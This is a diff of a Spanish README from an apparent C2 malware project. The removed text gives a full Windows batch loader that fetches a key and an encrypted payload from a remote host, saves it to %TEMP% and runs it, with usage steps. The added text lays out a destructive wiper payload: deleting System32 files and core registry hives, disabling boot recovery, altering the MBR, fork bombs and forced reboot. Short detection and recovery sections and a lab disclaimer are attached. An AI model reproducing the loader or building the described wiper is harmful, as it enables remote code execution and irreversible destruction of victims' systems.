@@ -1,140 +1,213 @@
-# ⚙️ Loader Script (Windows CMD) — Lab Usage
+# ⚠️ Destructive Payload Module (C2-Triggered)
 
-## 📌 Descripción
+## Overview
 
-Este script en Batch actúa como **loader cliente** para consumir la API del proyecto.
+Este repositorio documenta un **payload destructivo de endpoint** diseñado para ser ejecutado de forma remota por un sistema de comando y control (C2).
 
-Automatiza todo el flujo:
+El payload corresponde a la categoría de **wiper malware**, cuyo objetivo es provocar **daño irreversible en el sistema operativo**, incluyendo corrupción de datos, agotamiento de recursos y sabotaje del arranque.
 
-- Generación de timestamp
-- Obtención de clave temporal
-- Descarga del payload desde la API
-- Ejecución del payload en el sistema local
+> ⚠️ Este módulo está pensado únicamente para análisis, simulación o investigación en entornos controlados.
 
 ---
 
-## ⚙️ Flujo completo
+## Architecture Context
 
-```text
-Timestamp → Key → Payload → Ejecución
+Este componente **no es standalone**. Forma parte de una arquitectura mayor:
+
+```
+[C2 Server] ---> [Agent / Dropper] ---> [Payload Execution (este script)]
 ```
 
----
+### Flujo lógico
 
-## 📜 Código
-
-```bat
-@echo off
-setlocal
-
-set BASE=VPS
-set FILE=%temp%\sc.bat
-
-REM ===== TS =====
-for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
-
-REM ===== KEY =====
-for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i
-
-REM ===== PAYLOAD =====
-curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
-
-REM ===== EXEC (sincrono) =====
-call "%FILE%"
-```
+1. El C2 autentica/agrega contexto (nonce/token)
+2. El agente descarga el payload
+3. El payload se ejecuta localmente en el host objetivo
+4. Se inicia destrucción multi-vector en paralelo
+5. El sistema queda inutilizable
 
 ---
 
-## 🧩 Desglose técnico
+## Payload Objective
 
-### 1. Configuración
+El propósito del payload es:
 
-```bat
-set BASE=VPS
-set FILE=%temp%\sc.bat
-```
-
-- `BASE`: endpoint de la API
-- `FILE`: ruta temporal donde se guarda el payload
+- Destruir integridad del sistema
+- Impedir recuperación automática
+- Saturar recursos para bloquear intervención
+- Forzar estado no recuperable tras reinicio
 
 ---
 
-### 2. Generación de timestamp
+## Execution Model
 
-```bat
-powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"
-```
+El script utiliza ejecución concurrente mediante:
 
-- Usa PowerShell para obtener timestamp UNIX
-- Se guarda en variable `TS`
+- `start /b` → multiproceso en background
+- `cmd /c` → invocación recursiva
+- PowerShell → ejecución intensiva y evasiva
 
----
-
-### 3. Obtención de clave
-
-```bat
-curl -s "%BASE%/auth/key?ts=%TS%"
-```
-
-- Llama al endpoint `/auth/key`
-- Devuelve clave temporal
-- Se almacena en `KEY`
+Esto permite lanzar múltiples vectores simultáneamente.
 
 ---
 
-### 4. Descarga del payload
+## Attack Vectors
 
-```bat
-curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
-```
+### 1. Resource Exhaustion (CPU / RAM)
 
-- Envía la key en header
-- Descarga el payload
-- Lo guarda en `%TEMP%`
+- Creación masiva de procesos
+- Ejecución de loops infinitos en PowerShell
+- Intentos de asignación de memoria en grandes bloques
 
----
-
-### 5. Ejecución
-
-```bat
-call "%FILE%"
-```
-
-- Ejecuta el payload descargado
-- Modo sincrónico (espera a que termine)
+**Resultado:**
+- Sistema congelado
+- OOM (Out Of Memory)
+- Scheduler colapsado
 
 ---
 
-## 📈 Comportamiento
+### 2. Disk Saturation & File Destruction
 
-- No requiere instalación previa
-- No persiste por sí mismo
-- Ejecuta el payload directamente desde carpeta temporal
-- Todo el flujo ocurre en memoria + temp
+- Creación masiva de archivos grandes (`fsutil`)
+- Llenado completo del disco
+- Eliminación de archivos críticos del sistema
 
----
+Targets:
+- `System32\config`
+- `System32\drivers`
 
-## ⚡ Uso
-
-1. Guardar como `.bat`
-2. Ejecutar en Windows
-3. El script:
-   - Contacta la API
-   - Descarga payload
-   - Lo ejecuta automáticamente
+**Resultado:**
+- Corrupción del sistema operativo
+- Fallo de servicios esenciales
 
 ---
 
-## 🧠 Resumen
+### 3. Boot Manipulation
 
-Este script actúa como:
+- Modificación de `autoexec.bat`
+- Desactivación de recuperación (`bcdedit`)
+- Alteración del MBR (`bootrec`)
 
-```text
-Cliente automatizado de distribución de payload
-```
+**Resultado:**
+- Sistema no booteable
+- Recuperación limitada o imposible
 
-Encaja como punto de entrada del sistema:
+---
 
-```text
-API → Loader → Payload → Ejecución
-```
+### 4. Registry Wipe
+
+Eliminación de claves críticas:
+
+- `HKLM\SYSTEM`
+- `HKLM\SAM`
+- `HKLM\SOFTWARE`
+- `HKU`
+
+**Resultado:**
+- Sistema inconsistente
+- Fallos de autenticación y servicios
+
+---
+
+### 5. Service Disruption
+
+- Interferencia con servicios del sistema
+- Configuración de servicios inválidos
+- Terminación indirecta de procesos críticos
+
+---
+
+### 6. Fork Bomb / Process Explosion
+
+- Generación recursiva de procesos
+- Jobs infinitos en PowerShell
+
+**Resultado:**
+- Saturación total del sistema
+- Inestabilidad crítica
+
+---
+
+### 7. Forced Reboot
+
+- Reinicio inmediato forzado
+
+**Resultado final:**
+- Sistema inutilizable tras reinicio
+
+---
+
+## Classification
+
+- **Primary:**
+  - Wiper Malware
+
+- **Secondary behaviors:**
+  - Fork Bomb
+  - Resource Exhaustion Attack
+  - Disk Wiper
+  - Registry Corruption
+  - Boot Disruption
+
+---
+
+## Detection Considerations (Blue Team)
+
+Indicadores clave:
+
+- Creación masiva de procesos `cmd.exe` / `powershell.exe`
+- Uso intensivo de `fsutil`
+- Eliminación de claves críticas del registro
+- Cambios en BCD / MBR
+- Uso anómalo de CPU/RAM
+- Actividad destructiva en `System32`
+
+---
+
+## C2 Integration Notes (Conceptual)
+
+Este payload está diseñado para:
+
+- Ser entregado bajo demanda
+- Ejecutarse rápidamente sin dependencia externa
+- Maximizar impacto en corto tiempo
+- Reducir ventana de respuesta del sistema
+
+No incluye:
+- Persistencia avanzada
+- Exfiltración de datos
+- Comunicación post-ejecución
+
+Es un payload de tipo **"fire-and-forget destructive"**.
+
+---
+
+## Safe Usage (Lab Only)
+
+⚠️ Recomendado:
+
+- Ejecutar solo en máquinas virtuales desechables
+- Sin acceso a red o infraestructura real
+- Con snapshots previos
+- En entornos de análisis controlado (sandbox)
+
+---
+
+## Recovery
+
+Si este payload se ejecuta:
+
+1. Aislar el host inmediatamente
+2. Intentar recuperación desde medios externos
+3. En la mayoría de casos:
+   - Reinstalación completa del sistema
+4. Restaurar desde backups confiables
+
+---
+
+## Disclaimer
+
+Este repositorio tiene fines educativos, de investigación y simulación en ciberseguridad.  
+El uso indebido de este tipo de herramientas puede causar daños irreversibles.
+
+---
